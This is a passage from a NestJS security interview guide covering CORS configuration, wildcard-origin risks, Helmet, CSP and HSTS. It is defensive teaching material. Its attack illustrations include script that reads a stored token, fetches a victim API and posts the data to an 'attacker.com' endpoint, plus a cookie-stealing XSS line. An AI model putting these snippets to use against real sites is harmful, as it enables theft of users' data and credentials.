      'Don\'t allow all origins in production',
      'Don\'t expose sensitive headers',
      'Don\'t skip CORS validation',
    ],
  },
  development: {
    ✅: [
      'Can use origin: true (all origins)',
      'Test with actual frontend URLs',
    ],
  },
};

// 13. CORS Error Debugging
const corsErrors = {
  'No Access-Control-Allow-Origin header': {
    cause: 'CORS not enabled or origin not allowed',
    solution: 'app.enableCors({ origin: "https://frontend.com" })',
  },
  'Credentials flag is true, but Access-Control-Allow-Origin is *': {
    cause: 'Can\'t use * with credentials',
    solution: 'Specify exact origin instead of *',
  },
  'Request header Authorization not allowed': {
    cause: 'Authorization header not in allowedHeaders',
    solution: 'Add to allowedHeaders: ["Authorization"]',
  },
  'Method PUT not allowed': {
    cause: 'PUT not in allowed methods',
    solution: 'Add to methods: ["GET", "POST", "PUT"]',
  },
};

// 14. Complete Production Setup
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Production CORS configuration
  app.enableCors({
    origin: (origin, callback) => {
      const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];
      
      // Allow requests with no origin (mobile apps, server-to-server)
      if (!origin) return callback(null, true);
      
      if (allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        console.log(`Blocked by CORS: ${origin}`);
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    exposedHeaders: ['X-Total-Count'], // Headers frontend can read
    maxAge: 3600, // Cache preflight for 1 hour
  });

  await app.listen(process.env.PORT || 3000);
}
bootstrap();

// .env
// ALLOWED_ORIGINS=https://frontend.com,https://admin.frontend.com,https://mobile.frontend.com
```

**Interview Tip**: **CORS** = browser security preventing cross-origin API requests. **Why**: Protects users from malicious sites accessing APIs using their credentials. **Same-Origin**: Protocol + Domain + Port must match. **How**: Browser checks `Access-Control-Allow-Origin` header before allowing request. **NestJS**: `app.enableCors({ origin: 'https://frontend.com', credentials: true })`. **Security**: Never use `origin: '*'` with `credentials: true`, specify exact origins in production. **Preflight**: Browser sends OPTIONS request first for POST/PUT/DELETE and custom headers. **Production**: Use environment variables for allowed origins, validate origin on server.

</details>
13. How do you enable CORS in NestJS?

<details>
<summary><strong>Answer</strong></summary>

**Enable CORS**: Call **`app.enableCors()`** in `main.ts`. **Simple**: `app.enableCors()` allows all origins (development only). **Production**: `app.enableCors({ origin: 'https://frontend.com', credentials: true })` with specific origins. **Alternative**: Use `@nestjs/platform-express` CORS options. **Configuration**: Pass object with origin, methods, headers, credentials options.

```typescript
// Enabling CORS in NestJS - Complete Guide

// 1. Basic CORS (Development - Allow All)
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Simple CORS - allows all origins
  app.enableCors(); // ⚠️ Development only!
  
  await app.listen(3000);
}
bootstrap();

// 2. Production CORS (Specific Origin)
async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Specific origin
  app.enableCors({
    origin: 'https://frontend.com',
    credentials: true,
  });
  
  await app.listen(3000);
}

// 3. Multiple Origins
app.enableCors({
  origin: [
    'https://frontend.com',
    'https://admin.frontend.com',
    'http://localhost:3000', // Development
  ],
  credentials: true,
});

// 4. Dynamic Origin (Function)
app.enableCors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      'https://frontend.com',
      'https://admin.frontend.com',
    ];
    
    // Allow no origin (mobile apps, Postman)
    if (!origin) return callback(null, true);
    
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`Origin ${origin} not allowed by CORS`));
    }
  },
  credentials: true,
});

// 5. Environment-Based Configuration
// main.ts
import { ConfigService } from '@nestjs/config';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  const configService = app.get(ConfigService);
  
  const isProduction = configService.get('NODE_ENV') === 'production';
  
  if (isProduction) {
    // Production: specific origins
    app.enableCors({
      origin: configService.get('ALLOWED_ORIGINS')?.split(','),
      credentials: true,
    });
  } else {
    // Development: allow all
    app.enableCors();
  }
  
  await app.listen(3000);
}

// .env
// ALLOWED_ORIGINS=https://frontend.com,https://admin.frontend.com

// 6. Complete Configuration Object
app.enableCors({
  origin: 'https://frontend.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  credentials: true,
  preflightContinue: false,
  optionsSuccessStatus: 204,
  maxAge: 3600, // Cache preflight for 1 hour
});

// 7. Testing CORS
describe('CORS Configuration', () => {
  it('should allow requests from allowed origin', async () => {
    const response = await request(app.getHttpServer())
      .get('/users')
      .set('Origin', 'https://frontend.com')
      .expect(200);
    
    expect(response.headers['access-control-allow-origin']).toBe('https://frontend.com');
  });
  
  it('should block requests from unauthorized origin', async () => {
    await request(app.getHttpServer())
      .get('/users')
      .set('Origin', 'https://attacker.com')
      .expect(403); // or error
  });
});
```

**Interview Tip**: **Enable**: `app.enableCors()` in main.ts. **Development**: `app.enableCors()` allows all. **Production**: `app.enableCors({ origin: 'https://frontend.com', credentials: true })` with specific origins. **Dynamic**: Use function to validate origin dynamically. **Configuration**: Pass object with origin, methods, allowedHeaders, credentials, maxAge. **Environment**: Use `process.env.ALLOWED_ORIGINS.split(',')` for multiple origins. **Must combine**: credentials: true requires specific origin (not *).

</details>

14. How do you configure CORS options (origin, credentials, methods)?

<details>
<summary><strong>Answer</strong></summary>

**CORS Options**: **origin** (allowed origins), **credentials** (allow cookies), **methods** (HTTP methods), **allowedHeaders** (request headers), **exposedHeaders** (response headers), **maxAge** (preflight cache). **Origin**: string, array, regex, or function. **Credentials**: true to allow cookies (requires specific origin). **Methods**: array of HTTP methods. **Production**: Restrict all options to minimum needed.

```typescript
// CORS Configuration Options - Complete Guide

// 1. Complete CORS Options
app.enableCors({
  // Origin: allowed origins
  origin: 'https://frontend.com', // string | string[] | RegExp | function
  
  // Credentials: allow cookies/auth headers
  credentials: true, // boolean
  
  // Methods: allowed HTTP methods
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'], // string[]
  
  // AllowedHeaders: request headers frontend can send
  allowedHeaders: ['Content-Type', 'Authorization'], // string[]
  
  // ExposedHeaders: response headers frontend can read
  exposedHeaders: ['X-Total-Count', 'X-Page-Count'], // string[]
  
  // MaxAge: cache preflight for 1 hour
  maxAge: 3600, // number (seconds)
});

// 2. Origin Options
const originExamples = {
  string: 'https://frontend.com',
  array: ['https://frontend.com', 'https://admin.frontend.com'],
  regex: /^https:\/\/.*\.example\.com$/, // All subdomains
  function: (origin, callback) => {
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed'));
    }
  },
  boolean: true, // Allow all (development only)
};

// 3. Credentials Configuration
app.enableCors({
  origin: 'https://frontend.com', // Must be specific
  credentials: true, // ✅ Allow cookies
});

// ❌ This fails:
app.enableCors({
  origin: '*',
  credentials: true, // Error: Can't use * with credentials
});

// 4. Methods Configuration
app.enableCors({
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
});

// Read-only API
app.enableCors({
  methods: ['GET', 'HEAD'],
});

// 5. Headers Configuration
app.enableCors({
  // Request headers (what frontend can send)
  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-Requested-With',
  ],
  
  // Response headers (what frontend can read)
  exposedHeaders: [
    'X-Total-Count',
    'X-Page-Count',
    'X-Rate-Limit-Remaining',
  ],
});

// 6. Complete Production Config
app.enableCors({
  origin: (origin, callback) => {
    const allowed = process.env.ALLOWED_ORIGINS?.split(',') || [];
    if (!origin || allowed.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count'],
  maxAge: 3600,
});

// 7. Environment-Specific
export const getCorsConfig = () => {
  if (process.env.NODE_ENV === 'development') {
    return { origin: true, credentials: true };
  }
  
  return {
    origin: process.env.ALLOWED_ORIGINS?.split(','),
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
  };
};

// 8. Security Best Practices
const bestPractices = {
  ✅: [
    'Specific origins in production',
    'credentials only if needed',
    'Restrict methods to required',
    'Limit headers',
    'Use environment variables',
  ],
  ❌: [
    'origin: * with credentials',
    'All origins in production',
    'Unnecessary methods',
    'Hardcoded origins',
  ],
};
```

**Interview Tip**: **Options**: origin (domains), credentials (cookies), methods (HTTP verbs), allowedHeaders (requests), exposedHeaders (responses), maxAge (preflight cache). **Origin**: string, array, regex, function. **Credentials**: true allows cookies but needs specific origin. **Methods**: ['GET', 'POST', 'PUT', 'DELETE']. **Production**: Restrict to minimum - specific origins, required methods/headers only.

</details>
15. What are the security implications of allowing all origins?

<details>
<summary><strong>Answer</strong></summary>

**Allowing All Origins (`origin: '*'`)**: **CRITICAL SECURITY RISK** - allows ANY website to call your API. **Risks**: CSRF attacks, data theft, unauthorized API access, credential leakage if misconfigured. **Never**: Use `origin: '*'` with `credentials: true` (impossible anyway). **Development**: OK for testing. **Production**: ALWAYS specify exact origins. **Impact**: Attacker site can steal user data, make unauthorized requests.

```typescript
// Security Implications of Allowing All Origins

// 1. DANGEROUS: Allow All Origins
// ❌ NEVER DO THIS IN PRODUCTION
app.enableCors({
  origin: '*', // Allows ANY website to call your API
  credentials: false, // Can't enable with *
});

// Attack Scenario:
/*
// User visits attacker.com
// attacker.com makes request to your-api.com
<script>
  fetch('https://your-api.com/api/users', {
    method: 'GET',
    headers: { 'Authorization': 'Bearer stolen-token' }
  })
  .then(res => res.json())
  .then(data => {
    // Attacker steals all user data
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>

// Because origin: '*', browser allows this request!
*/

// 2. Security Risks of origin: '*'
const securityRisks = {
  dataTheft: {
    risk: 'Malicious site can read API responses',
    scenario: 'Attacker site fetches /api/users and steals data',
    impact: 'Critical - exposes all API data',
  },
  csrfLike: {
    risk: 'Unauthorized actions on behalf of users',
    scenario: 'Attacker site calls /api/transfer with user token',
    impact: 'High - if tokens stored in localStorage',
  },
  apiAbuse: {
    risk: 'Anyone can use your API',
    scenario: 'Competitor scrapes your data, DDoS attacks',
    impact: 'Medium - increased costs, service degradation',
  },
  reputationDamage: {
    risk: 'Your API used in attacks',
    scenario: 'Attackers use your API as proxy',
    impact: 'High - legal liability, reputation loss',
  },
};

// 3. Attack Examples
const attackExamples = {
  example1_DataTheft: {
    attack: `
      <!-- attacker.com -->
      <script>
        // User has token in localStorage (bad practice already)
        fetch('https://victim-api.com/api/sensitive-data', {
          headers: {
            'Authorization': 'Bearer ' + localStorage.getItem('token')
          }
        })
        .then(res => res.json())
        .then(data => {
          // Send stolen data to attacker
          fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(data)
          });
        });
      </script>
      
      // Works because victim-api.com allows origin: '*'
    `,
    prevented: 'If origin was restricted to legitimate-frontend.com',
  },
  
  example2_APIAbuse: {
    attack: `
      <!-- competitor.com -->
      <script>
        // Scrape all your API data
        for (let page = 1; page <= 100; page++) {
          fetch('https://victim-api.com/api/products?page=' + page)
            .then(res => res.json())
            .then(products => {
              // Store competitor's own database
              storeInOwnDB(products);
            });
        }
      </script>
      
      // Your API becomes their free data source
    `,
    prevented: 'If origin was restricted',
  },
};

// 4. Why origin: '*' is Sometimes Used (Bad Reasons)
const badReasons = {
  '❌ "It\'s easier"': {
    problem: 'Lazy configuration',
    solution: 'Spend 5 minutes configuring proper origins',
  },
  '❌ "We have many clients"': {
    problem: 'Can list all legitimate clients',
    solution: 'Use array of origins or dynamic validation',
  },
  '❌ "It\'s a public API"': {
    problem: 'Public ≠ no origin control',
    solution: 'Use API keys + rate limiting, still restrict origins',
  },
  '❌ "We use tokens for auth"': {
    problem: 'Tokens can be stolen',
    solution: 'Defense in depth - restrict origins too',
  },
};

// 5. Correct Approach: Specific Origins
app.enableCors({
  origin: [
    'https://frontend.com',
    'https://admin.frontend.com',
    'https://mobile.frontend.com',
  ],
  credentials: true,
});

// 6. Dynamic Origin Validation (Production)
app.enableCors({
  origin: (origin, callback) => {
    // Whitelist from environment
    const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];
    
    // Allow no origin (mobile apps, server-to-server)
    if (!origin) {
      return callback(null, true);
    }
    
    // Check whitelist
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }
    
    // Check subdomain pattern
    const domainRegex = /^https:\/\/.*\.yourdomain\.com$/;
    if (domainRegex.test(origin)) {
      return callback(null, true);
    }
    
    // Reject and log
    console.error(`CORS blocked unauthorized origin: ${origin}`);
    callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
});

// 7. Development vs Production
const environmentConfig = {
  development: {
    cors: {
      origin: true, // Allow all for easier testing
      note: '⚠️ Development only!',
    },
  },
  staging: {
    cors: {
      origin: [
        'https://staging.frontend.com',
        'http://localhost:3000',
      ],
      note: 'Specific origins, include localhost',
    },
  },
  production: {
    cors: {
      origin: process.env.ALLOWED_ORIGINS?.split(','),
      note: '✅ Strict whitelist only',
    },
  },
};

// 8. Exception: Public Read-Only APIs
// Even public APIs should have some restrictions
app.enableCors({
  origin: '*', // OK for truly public read-only data
  credentials: false, // No cookies/auth
  methods: ['GET', 'HEAD'], // Read only
  // Still consider:
  // - Rate limiting
  // - API keys
  // - Monitoring for abuse
});

// Example: Public weather API, stock prices, etc.
// But still implement rate limiting!

// 9. Monitoring and Logging
@Injectable()
export class CorsLogger {
  logBlockedRequest(origin: string, endpoint: string) {
    console.error({
      timestamp: new Date().toISOString(),
      event: 'CORS_BLOCKED',
      origin,
      endpoint,
      message: 'Unauthorized origin attempted access',
    });
    
    // Send to monitoring service
    this.monitoringService.alert({
      severity: 'high',
      type: 'security',
      message: `CORS violation from ${origin}`,
    });
  }
}

// 10. Security Checklist
const securityChecklist = {
  production: {
    '✅ Specific origins': 'List all legitimate domains',
    '✅ Environment variables': 'ALLOWED_ORIGINS from .env',
    '✅ No wildcards': 'Never use * in production',
    '✅ Credentials restricted': 'Only with specific origins',
    '✅ Logging': 'Log blocked CORS requests',
    '✅ Monitoring': 'Alert on suspicious patterns',
    '✅ Regular audits': 'Review allowed origins quarterly',
  },
  development: {
    '⚠️ origin: true': 'OK for local testing only',
    '⚠️ Document': 'Comment that it\'s dev-only',
    '⚠️ Never commit': 'Don\'t commit origin: * to production',
  },
};

// 11. Impact Comparison
const impactComparison = {
  withWildcard: {
    dataExposure: '❌ High - any site can fetch data',
    apiAbuse: '❌ High - anyone can use your API',
    ddos: '❌ High - easy to abuse',
    compliance: '❌ Fails security audits',
    cost: '❌ Increased bandwidth/compute costs',
  },
  withSpecificOrigins: {
    dataExposure: '✅ Low - only trusted sites',
    apiAbuse: '✅ Low - controlled access',
    ddos: '✅ Medium - still need rate limiting',
    compliance: '✅ Passes security audits',
    cost: '✅ Controlled costs',
  },
};

// 12. Real-World Example: API Gateway
@Injectable()
export class SecureCorsMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    const origin = req.headers.origin;
    const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];
    
    if (origin && !allowedOrigins.includes(origin)) {
      // Log suspicious activity
      console.error(`Blocked request from unauthorized origin: ${origin}`);
      
      // Increment security metrics
      this.metricsService.increment('cors.blocked');
      
      // Return error
      return res.status(403).json({
        error: 'Forbidden',
        message: 'Origin not allowed',
      });
    }
    
    next();
  }
}

// 13. Migration Strategy (If Currently Using *)
const migrationSteps = {
  step1: {
    action: 'Audit current API consumers',
    task: 'List all legitimate domains accessing your API',
  },
  step2: {
    action: 'Add allowed origins',
    task: 'Create ALLOWED_ORIGINS environment variable',
  },
  step3: {
    action: 'Deploy with logging',
    task: 'Log all CORS requests to identify missing origins',
  },
  step4: {
    action: 'Monitor for 1 week',
    task: 'Add any legitimate origins that were missed',
  },
  step5: {
    action: 'Enforce strict CORS',
    task: 'Remove origin: * from production',
  },
};

// 14. Best Practices Summary
const bestPractices = {
  '✅ DO': [
    'Use specific origins in production',
    'Store origins in environment variables',
    'Validate origins dynamically',
    'Log blocked CORS requests',
    'Regular security audits',
    'Combine with rate limiting',
    'Use credentials only with specific origins',
  ],
  '❌ DON\'T': [
    'Use origin: * in production',
    'Allow credentials with *',
    'Hardcode origins in code',
    'Ignore CORS violations in logs',
    'Assume tokens alone provide security',
    'Skip origin validation',
  ],
};
```

**Interview Tip**: **origin: '*'** = CRITICAL RISK - allows ANY site to call your API. **Risks**: Data theft (attacker site fetches sensitive data), API abuse (scraping, DDoS), CSRF-like attacks. **Why dangerous**: Browser allows any site to make requests, steal responses. **Never**: Use * with credentials (impossible anyway). **Production**: ALWAYS specific origins like ['https://frontend.com'], use environment variables, log blocked requests. **Exception**: Public read-only APIs can use * but still need rate limiting. **Impact**: Without restrictions, competitor can scrape data, attacker can steal user info, reputation damage.

</details>

## Helmet

16. What is Helmet middleware?

<details>
<summary><strong>Answer</strong></summary>

**Helmet**: Middleware that **sets secure HTTP headers** to protect against common web vulnerabilities. **Purpose**: Adds ~15 security headers like **CSP**, **HSTS**, **X-Frame-Options**, **X-Content-Type-Options**. **Installation**: `npm install helmet`. **Usage**: `app.use(helmet())` in main.ts. **Protection**: XSS, clickjacking, MIME sniffing, protocol downgrade attacks. **Production**: Essential security layer.

```typescript
// Helmet Middleware - Complete Guide

// 1. What is Helmet?
const helmetOverview = {
  purpose: 'Set secure HTTP headers automatically',
  protectsAgainst: [
    'XSS attacks',
    'Clickjacking',
    'MIME sniffing',
    'Protocol downgrade',
    'Various injection attacks',
  ],
  headers: [
    'Content-Security-Policy',
    'X-Content-Type-Options',
    'X-Frame-Options',
    'Strict-Transport-Security',
    'X-Download-Options',
    'X-DNS-Prefetch-Control',
    'X-Permitted-Cross-Domain-Policies',
  ],
};

// 2. Installation
/*
npm install helmet
npm install -D @types/helmet
*/

// 3. Basic Usage in NestJS
// main.ts
import { NestFactory } from '@nestjs/core';
import * as helmet from 'helmet';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Enable Helmet with defaults
  app.use(helmet());
  
  await app.listen(3000);
}
bootstrap();

// 4. Headers Helmet Sets (Default Configuration)
const defaultHeaders = {
  'Content-Security-Policy': "default-src 'self'",
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'SAMEORIGIN',
  'Strict-Transport-Security': 'max-age=15552000; includeSubDomains',
  'X-Download-Options': 'noopen',
  'X-DNS-Prefetch-Control': 'off',
  'X-Permitted-Cross-Domain-Policies': 'none',
  'Referrer-Policy': 'no-referrer',
  'X-XSS-Protection': '0', // Disabled in modern browsers (CSP preferred)
};

// 5. Custom Helmet Configuration
app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:'],
    },
  },
  
  // HTTP Strict Transport Security
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  },
  
  // X-Frame-Options
  frameguard: {
    action: 'deny', // or 'sameorigin'
  },
  
  // Referrer Policy
  referrerPolicy: {
    policy: 'no-referrer',
  },
}));

// 6. Production Configuration
// main.ts
async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Comprehensive Helmet setup
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        baseUri: ["'self'"],
        fontSrc: ["'self'", 'https:', 'data:'],
        formAction: ["'self'"],
        frameAncestors: ["'none'"], // Prevent clickjacking
        imgSrc: ["'self'", 'data:', 'https:'],
        objectSrc: ["'none'"],
        scriptSrc: ["'self'"],
        scriptSrcAttr: ["'none'"],
        styleSrc: ["'self'", 'https:', "'unsafe-inline'"],
        upgradeInsecureRequests: [],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
    frameguard: {
      action: 'deny',
    },
    noSniff: true,
    xssFilter: false, // Deprecated, use CSP
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },
  }));
  
  await app.listen(3000);
}

// 7. Helmet Components Breakdown
const helmetComponents = {
  contentSecurityPolicy: {
    purpose: 'Prevent XSS, injection attacks',
    header: 'Content-Security-Policy',
    example: "default-src 'self'; script-src 'self' https://trusted.com",
  },
  hsts: {
    purpose: 'Force HTTPS, prevent protocol downgrade',
    header: 'Strict-Transport-Security',
    example: 'max-age=31536000; includeSubDomains; preload',
  },
  frameguard: {
    purpose: 'Prevent clickjacking',
    header: 'X-Frame-Options',
    example: 'DENY or SAMEORIGIN',
  },
  noSniff: {
    purpose: 'Prevent MIME type sniffing',
    header: 'X-Content-Type-Options',
    example: 'nosniff',
  },
  referrerPolicy: {
    purpose: 'Control referer information',
    header: 'Referrer-Policy',
    example: 'no-referrer',
  },
};

// 8. API vs Web App Configuration
const configurations = {
  restAPI: {
    helmet: helmet({
      contentSecurityPolicy: false, // Not needed for API
      crossOriginEmbedderPolicy: false,
      crossOriginOpenerPolicy: false,
      crossOriginResourcePolicy: false,
      hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
      },
    }),
    note: 'Simpler config for pure APIs',
  },
  
  webApp: {
    helmet: helmet({
      contentSecurityPolicy: {
        directives: {
          defaultSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          scriptSrc: ["'self'"],
        },
      },
      hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true,
      },
    }),
    note: 'Full config for web applications',
  },
};

// 9. Testing Helmet Headers
describe('Helmet Security Headers', () => {
  it('should set X-Content-Type-Options', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/users')
      .expect(200);
    
    expect(response.headers['x-content-type-options']).toBe('nosniff');
  });
  
  it('should set X-Frame-Options', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/users')
      .expect(200);
    
    expect(response.headers['x-frame-options']).toBe('DENY');
  });
  
  it('should set Strict-Transport-Security', async () => {
    const response = await request(app.getHttpServer())
      .get('/api/users')
      .expect(200);
    
    expect(response.headers['strict-transport-security']).toContain('max-age');
  });
});

// 10. Environment-Based Configuration
// config/helmet.config.ts
export const getHelmetConfig = () => {
  const isProduction = process.env.NODE_ENV === 'production';
  
  if (!isProduction) {
    return helmet({
      contentSecurityPolicy: false, // Easier development
    });
  }
  
  return helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  });
};

// main.ts
import { getHelmetConfig } from './config/helmet.config';

app.use(getHelmetConfig());

// 11. Helmet with GraphQL
// GraphQL often needs inline scripts
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // GraphQL Playground
    },
  },
  // Disable CSP in development for GraphQL Playground
  ...(process.env.NODE_ENV === 'development' && {
    contentSecurityPolicy: false,
  }),
}));

// 12. Security Headers Without Helmet (Manual)
// If you can't use Helmet for some reason
@Injectable()
export class SecurityHeadersMiddleware implements NestMiddleware {
  use(req: Request, res: Response, next: NextFunction) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '0');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('Referrer-Policy', 'no-referrer');
    next();
  }
}

// 13. Common Issues and Solutions
const commonIssues = {
  'CSP blocks inline styles': {
    issue: 'Content blocked by CSP',
    solution: "Add 'unsafe-inline' to styleSrc (carefully)",
  },
  'GraphQL Playground broken': {
    issue: 'CSP blocks playground scripts',
    solution: 'Disable CSP in development',
  },
  'Images not loading': {
    issue: 'CSP blocks external images',
    solution: "Add domains to imgSrc: ['self', 'https://cdn.example.com']",
  },
};

// 14. Security Checklist
const securityChecklist = {
  '✅ Helmet enabled': 'app.use(helmet())',
  '✅ HSTS configured': 'Force HTTPS for 1 year',
  '✅ CSP configured': 'Prevent XSS attacks',
  '✅ X-Frame-Options': 'Prevent clickjacking',
  '✅ noSniff': 'Prevent MIME sniffing',
  '✅ Tested': 'Verify headers in responses',
  '✅ Production config': 'Strict settings in prod',
};
```

**Interview Tip**: **Helmet** = middleware that sets ~15 secure HTTP headers automatically. **Purpose**: Protect against XSS, clickjacking, MIME sniffing, protocol downgrade. **Key headers**: Content-Security-Policy (XSS prevention), HSTS (force HTTPS), X-Frame-Options (clickjacking), X-Content-Type-Options (MIME sniffing). **Usage**: `app.use(helmet())` in main.ts. **Configuration**: Customize CSP directives, HSTS duration, frame options. **Production**: Essential security layer, combine with CORS, rate limiting, input validation. **API vs Web**: APIs can disable CSP, web apps need full config.

</details>
17. How do you use Helmet in NestJS?

<details>
<summary><strong>Answer</strong></summary>

**Usage**: Install `npm install helmet`, then `app.use(helmet())` in `main.ts`. **Basic**: `app.use(helmet())` with defaults. **Custom**: Pass configuration object to customize headers. **Position**: Add before routes. **Production**: Always enable with strict settings. **Combine**: Use with CORS, rate limiting, validation for complete security.

```typescript
// Using Helmet in NestJS

// 1. Installation
// npm install helmet

// 2. Basic Usage
// main.ts
import { NestFactory } from '@nestjs/core';
import * as helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  app.use(helmet()); // Enable with defaults
  
  await app.listen(3000);
}

// 3. Custom Configuration
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  },
  hsts: {
    maxAge: 31536000,
  },
}));

// 4. Production Setup
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  frameguard: { action: 'deny' },
}));
```

**Interview Tip**: Install `helmet`, use `app.use(helmet())` in main.ts before routes. Customize with configuration object. Essential for production security.

</details>

18. What HTTP headers does Helmet set (CSP, HSTS, X-Frame-Options)?

<details>
<summary><strong>Answer</strong></summary>

**Key Headers**: **Content-Security-Policy** (XSS prevention), **Strict-Transport-Security** (HSTS, force HTTPS), **X-Frame-Options** (clickjacking prevention), **X-Content-Type-Options** (MIME sniffing), **Referrer-Policy** (referrer control). **Total**: ~15 security headers. **Purpose**: Each protects against specific attack vector. **Production**: All enabled by default with helmet().

```typescript
// Helmet Security Headers

const helmetHeaders = {
  'Content-Security-Policy': {
    purpose: 'Prevent XSS, injection attacks',
    example: "default-src 'self'; script-src 'self'",
    protection: 'XSS, injection',
  },
  'Strict-Transport-Security': {
    purpose: 'Force HTTPS connections',
    example: 'max-age=31536000; includeSubDomains',
    protection: 'Protocol downgrade, MITM',
  },
  'X-Frame-Options': {
    purpose: 'Prevent clickjacking',
    example: 'DENY or SAMEORIGIN',
    protection: 'Clickjacking',
  },
  'X-Content-Type-Options': {
    purpose: 'Prevent MIME sniffing',
    example: 'nosniff',
    protection: 'MIME confusion attacks',
  },
  'Referrer-Policy': {
    purpose: 'Control referrer information',
    example: 'no-referrer',
    protection: 'Information leakage',
  },
};
```

**Interview Tip**: **CSP** (XSS prevention), **HSTS** (force HTTPS), **X-Frame-Options** (clickjacking), **X-Content-Type-Options** (MIME sniffing), **Referrer-Policy** (privacy). Each protects against specific attacks.

</details>

19. What is Content Security Policy (CSP)?

<details>
<summary><strong>Answer</strong></summary>

**CSP**: HTTP header controlling what resources browser can load. **Purpose**: Prevent **XSS attacks** by restricting scripts, styles, images sources. **Directives**: `default-src`, `script-src`, `style-src`, `img-src`. **Example**: `default-src 'self'; script-src 'self' https://trusted.com`. **Protection**: Blocks inline scripts, untrusted sources. **Production**: Essential XSS defense.

```typescript
// Content Security Policy

// CSP Configuration
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"], // Default: only same origin
      scriptSrc: ["'self'", 'https://trusted.com'], // Scripts
      styleSrc: ["'self'", "'unsafe-inline'"], // Styles
      imgSrc: ["'self'", 'data:', 'https:'], // Images
      connectSrc: ["'self'", 'https://api.example.com'], // AJAX
      fontSrc: ["'self'", 'https://fonts.googleapis.com'],
      objectSrc: ["'none'"], // Block plugins
      frameSrc: ["'none'"], // Block iframes
    },
  },
}));

// XSS Protection Example
// ❌ Without CSP: This XSS attack works
// <script>steal(document.cookie)</script>

// ✅ With CSP: Browser blocks inline script
// CSP: script-src 'self'
// Browser: "Refused to execute inline script"
```

**Interview Tip**: CSP controls resource loading to prevent XSS. Key directives: `default-src`, `script-src`, `style-src`. Blocks inline scripts and untrusted sources. Essential XSS defense.

</details>

20. What is HTTP Strict Transport Security (HSTS)?

<details>
<summary><strong>Answer</strong></summary>

**HSTS**: HTTP header forcing browsers to **only use HTTPS**, never HTTP. **Purpose**: Prevent **protocol downgrade attacks** and **MITM**. **Header**: `Strict-Transport-Security: max-age=31536000; includeSubDomains`. **Duration**: Browser remembers for 1 year (31536000 seconds). **Protection**: Even if user types http://, browser upgrades to https://. **Production**: Essential with HTTPS.

```typescript
// HSTS Configuration

app.use(helmet({
  hsts: {
    maxAge: 31536000, // 1 year in seconds
    includeSubDomains: true, // Apply to subdomains
